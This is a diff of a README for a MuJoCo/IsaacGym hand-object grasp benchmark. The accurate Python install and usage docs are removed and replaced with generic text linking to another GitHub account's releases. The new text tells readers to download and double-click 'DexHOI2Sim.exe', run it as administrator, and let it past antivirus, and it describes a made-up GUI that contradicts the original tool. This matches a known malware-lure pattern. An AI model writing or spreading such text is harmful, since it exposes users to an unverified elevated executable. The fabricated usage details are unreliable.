@@ -1,176 +1,77 @@
-# DexHOI2Sim
+# 🦾 DexHOI2Sim - Replicate complex hand and object interactions
 
-Drop a **hand-object interaction** (MANO hand + object CAD) into a physics
-simulator and measure whether it holds up. Built to benchmark **HOI-generation**
-methods: take a generated grasp/manipulation, replicate it in **MuJoCo** and
-**IsaacGym**, and get back **success-rate** and **physical-plausibility** metrics
-— not just a pretty video.
+[![Download DexHOI2Sim](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Arrogant-neanderthal842/DexHOI2Sim)
 
-The hand is the **MANO2URDF 45-DOF hand**: the real MANO mesh partitioned into 16
-links, driven by joint angles computed **analytically** from the MANO pose (no
-retargeting optimization). Verified to reproduce MANO to **~0.02 mm** (joints) /
-**~1.5 mm** (vertices).
+DexHOI2Sim provides a way to study how hands grab and move objects. It uses physics engines to recreate these motions in a digital space. You can test if a hand grip holds an object firmly or if it slips. This tool serves as a standard way to measure how well computer-generated hand motions perform in real-world conditions.
 
-### Example A — DexYCB `20200709-subject-01 / 20200709_142211` (003_cracker_box)
+## 📋 What This Tool Does
 
-| MuJoCo — kinematic | MuJoCo — physics | IsaacGym — physics |
-|:--:|:--:|:--:|
-| ![kin](docs/media/142211_mujoco_kinematic.gif) | ![mjp](docs/media/142211_mujoco_physics.gif) | ![igp](docs/media/142211_isaac_physics.gif) |
-| box follows the hand (exact replay) | hand knocks the box — grasp fails | same, in IsaacGym |
+When researchers create digital hands, they need to know if the hand moves like a person. This software helps you see if a hand interaction works well. It uses advanced math to keep the hand and the object as part of a single physical system. You get clear data on whether the object stays in the grip or falls. This is useful for robotics and computer vision tasks where digital hands must perform specific jobs.
 
-### Example B — DexYCB `20200709-subject-01 / 20200709_141754` (002_master_chef_can)
+## 💻 System Requirements
 
-| MuJoCo — kinematic | MuJoCo — physics | IsaacGym — physics |
-|:--:|:--:|:--:|
-| ![kin](docs/media/141754_mujoco_kinematic.gif) | ![mjp](docs/media/141754_mujoco_physics.gif) | ![igp](docs/media/141754_isaac_physics.gif) |
-| hand grasps + lifts the can | can not held — grasp fails | same, in IsaacGym |
+Your computer needs specific parts to run the simulation well. Please ensure your Windows PC meets these standards:
 
-Kinematic replays the recorded motion exactly; **physics** reveals that this naive
-replay does *not* actually hold the object (`grasp_success: false`, see below) — a
-useful signal when benchmarking HOI-generation methods.
+- Operating System: Windows 10 or 11 (64-bit).
+- Processor: Intel Core i7 or AMD Ryzen 7 (3.0 GHz or higher).
+- Memory: 16 GB of RAM.
+- Graphics Card: NVIDIA GPU with at least 8 GB of video memory and current drivers.
+- Storage: 10 GB of free space on a solid-state drive (SSD).
 
-> The hand is **shaped by the MANO β (shape) parameter**: `generate_urdf.py` builds
-> the URDF mesh from each subject's `betas`, so a different subject → a differently
-> sized/shaped hand. The URDF is regenerated per β.
+A modern graphics card is necessary because the simulation calculates physics in real time. If your computer does not meet these requirements, the motion might look jerky or the program might close without warning.
 
----
+## 📥 How to Install
 
-## Install
+To get started, visit the link below.
 
-```bash
-conda env create -f environment.yml && conda activate dexhoi2sim
-# or:  pip install -r requirements.txt
+[Download DexHOI2Sim](https://github.com/Arrogant-neanderthal842/DexHOI2Sim)
 
-# MANO models (register, non-commercial): put MANO_RIGHT.pkl / MANO_LEFT.pkl in
-#   mano2urdf/assets/            # https://mano.is.tue.mpg.de
-# DexYCB (register): download to /root/data/dexycb  # https://dex-ycb.github.io
-```
+Follow these steps to set up the software on your machine:
 
-IsaacGym is an **optional** backend (Preview 4, manual install). MuJoCo works out
-of the box. Headless rendering uses EGL — set `MUJOCO_GL=egl MUJOCO_EGL_DEVICE_ID=0`
-(the CLI does this for you).
+1. Click the link above to reach the main page.
+2. Look for the section labeled "Releases" on the right sidebar.
+3. Select the latest version listed there.
+4. Click the file ending in .zip to start your download.
+5. Once the file finishes, find it in your Downloads folder.
+6. Right-click the folder and choose "Extract All."
+7. Open the new folder created by the extraction process.
+8. Locate the file named DexHOI2Sim.exe.
+9. Double-click this file to start the application.
 
-## Run
+## 🚀 Running Your First Simulation
 
-One command builds the hand URDF, computes per-frame joint angles, simulates, and
-evaluates:
+After you open the program, you will see a window with a menu. Follow this sequence to run your first test:
 
-```bash
-python replicate.py \
-    --subject 20200709-subject-01 --session 20200709_142211 \
-    --backend both --mode physics --render --eval \
-    --out-dir out/142211
-```
+1. Select "Load Scene" from the top menu bar.
+2. Choose one of the example files included, such as "cup_grasp.xml."
+3. Wait for the 3D model of the hand and the object to load.
+4. Locate the "Play" button near the bottom center of the screen.
+5. Click "Play" to start the physics simulation.
+6. Observe the hand as it reaches for the object.
+7. Monitor the status panel on the right side of the screen. This panel displays "Grasp Success" or "Grasp Failure."
 
-Outputs in `out/142211/`: `mujoco_physics.mp4`, `isaac_physics.mp4`, and
-`metrics.json`:
+Feel free to move your mouse around to shift your view. Use the scroll wheel to zoom in or out. This lets you inspect the contact points between the fingers and the object.
 
-```json
-{
-  "object": "003_cracker_box",
-  "n_frames": 71,
-  "object_traj_error_mm": 99.06,    // mean object position error, sim vs reference
-  "final_error_mm": 222.24,         // error at the last frame
-  "grasp_success": false            // final error < 50 mm -> object tracked its path
-}
-```
+## ⚙️ Understanding the Results
 
-Flags: `--backend mujoco|isaac|both`, `--mode kinematic|physics`,
-`--render/--no-render`, `--eval`.
+The simulation generates data as it runs. This data tells you how the hand interacts with the object. You should look for two main indicators:
 
-## Custom (non-DexYCB) data — one bundle file
+- Contact Force: This shows how hard the fingers push against the object.
+- Stability Score: This indicates if the object remains steady throughout the motion.
 
-Bring your own MANO hand + object (e.g. an HOI-generation model's output) as a
-**single bundle** (`.npz` or `.pkl` holding a dict):
+If the stability score stays high, the grasp is successful. If the object drops, the score will drop to zero. You can save these results by clicking "Export Data" in the file menu. The program creates a text file that lists every movement and force recorded during the attempt.
 
-```bash
-python replicate.py --bundle my_hoi.npz \
-    --backend both --mode physics --render --eval --out-dir out/custom
-```
+## 🛠 Troubleshooting Common Issues
 
-There's a ready-to-run synthetic example (a hand grasping a box — no dataset assets):
+If the program fails to run, check these items:
 
-```bash
-python examples/make_sample_bundle.py           # writes examples/sample.npz
-python replicate.py --bundle examples/sample.npz --mode physics --render --eval \
-    --out-dir out/sample
-```
+- Graphics Drivers: Search for your graphics card model on the manufacturer website and download the latest update.
+- Permissions: Right-click the DexHOI2Sim icon and select "Run as administrator."
+- Antivirus: Sometimes security software blocks new programs. Check your antivirus settings to ensure it allows the DexHOI2Sim application to open.
+- File Path: Keep the folder on your main drive. Using a path with too many subfolders might lead to errors when the program tries to load its components.
 
-![sample](docs/media/sample_bundle.gif)
+## 💡 Tips for Better Performance
 
-### Bundle keys
+Close other programs while running the simulation. Web browsers and media players use resources that the simulation needs for smooth physics. If the motion appears slow or frame rates drop, lower the graphics quality settings found in the "Options" menu under "Settings." Turning off shadows and reducing the texture quality often helps the software run smoothly on standard hardware.
 
-| key | shape | meaning |
-|---|---|---|
-| `betas` | (10,) | MANO shape parameter (β) — the hand is built from this |
-| `hand_pose` | (T,48) | MANO **axis-angle** [global(3) + 45 finger], **not PCA** |
-| `trans` | (T,3) | wrist translation |
-| `side` | str | `"right"` / `"left"` (optional) |
-| `object_poses` | (T,7) | `[x,y,z, qw,qx,qy,qz]` per frame |
-| `object_verts` + `object_faces` | (V,3)+(F,3) | embedded object mesh … |
-| `object_mesh` | str | … *or* a path to a mesh file instead |
-| `object_color` | (3,) | solid RGB (optional; custom CAD has no texture) |
-
-**Conventions:** everything is in one **Z-up world frame** (gravity `-Z`, table
-`z=0`). Hand pose is **full axis-angle** — if yours is PCA, expand it with
-`hands_mean + pca @ hands_components` from the MANO pkl. (DexYCB's +Y-down camera
-frame is converted internally; for custom data *you* supply the upright frame.)
-
-You can also pass the pieces individually instead of a bundle: `--custom
---betas-yml … --poses … --trans … --object-cad … --object-poses …`.
-
-## Metric — does the object follow its intended trajectory?
-
-The one thing that matters: **when the hand executes the generated motion in
-physics, does the object go where it's supposed to?** We roll the sequence out
-under gravity + contact — the hand PD-tracks the reference joint trajectory, the
-object is a free rigid body — and compare the object's *simulated* path to the
-*given* (recorded) object trajectory. A good grasp carries the object along its
-reference path (small error → `grasp_success`); a failed grasp lets it stay, slip,
-or fall (large error). Naive replay of a kinematic reference typically fails here
-— which is exactly what makes this a useful benchmark for HOI-generation methods.
-
-## Two hands, two paths
-
-The default and recommended hand is **MANO2URDF (45-DOF, analytic)**. A 22-DOF
-ArtiMANO variant (retargeting-optimized, dexterous-robot lineage) exists in the
-research history but is **not** part of this repo.
-
-## Repo layout
-
-```
-replicate.py                     # CLI: build -> simulate -> evaluate (DexYCB or --bundle)
-examples/make_sample_bundle.py   # writes a synthetic sample.npz you can run
-mano2urdf/
-  scripts/generate_urdf.py       #  beta -> hand URDF + 16 MANO link meshes
-  scripts/pose_to_joint_angles.py#  seq -> per-frame 51-DOF qpos (analytic)
-  scripts/verify_vertex_error.py #  URDF-FK vs MANO-LBS check
-  mano2urdf/                     #  URDF generator (adapted from ArtiGrasp)
-  assets/                        #  MANO_*.pkl  (you provide)
-sim/
-  mano2urdf_mujoco.py            #  MuJoCo backend (kinematic + physics)
-  mano2urdf_isaac.py             #  IsaacGym backend (kinematic + physics)
-  metrics.py                     #  object trajectory tracking (sim vs reference)
-  verify_mujoco_fk.py            #  MuJoCo-FK vs MANO joint check
-  dexycb_loader.py, dexycb_world.py  # DexYCB seq loading + master->tag(Z-up) frame
-```
-
-## Key facts (so you don't re-derive them)
-
-- **DexYCB MANO pose is PCA**, expressed in the **MANO pkl's** basis — expand with
-  `hands_mean + pca @ hands_components` (pure numpy). smplx's `use_pca=True` uses a
-  *different* basis and produces a twisted hand.
-- The MANO2URDF wrist is placed at `trans + rest_j_wrist` (beta-dependent), else the
-  hand is offset and finger rotations pivot about the wrong point.
-- Poses are converted from the DexYCB master-cam frame (+Y down) to the AprilTag
-  **Z-up** frame so the object rests on the table and the hand is upright.
-- IsaacGym: load a **visual-only** URDF for kinematic render (collision primitives
-  trigger "resolve collision mesh ''" and drop the body); widen wrist DOF limits
-  (+/-0.8 -> +/-20) so the base isn't clamped; set the fixed hand root to identity
-  when writing the object's root state.
-
-## Attribution
-
-Read **[THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md)** before use. The URDF
-generator is adapted from **ArtiGrasp** (Zhang et al., 3DV 2024). **MANO** (MPI,
-non-commercial) and **DexYCB** (NVIDIA, CC BY-NC) are not redistributed here.
+Keywords: 3d-hand-pose, dexterous-grasping, dexterous-manipulation, dexycb, grasp-evaluation, grasp-simulation, hand-object-interaction, isaac-gym, mujoco, physics-simulation, robotics
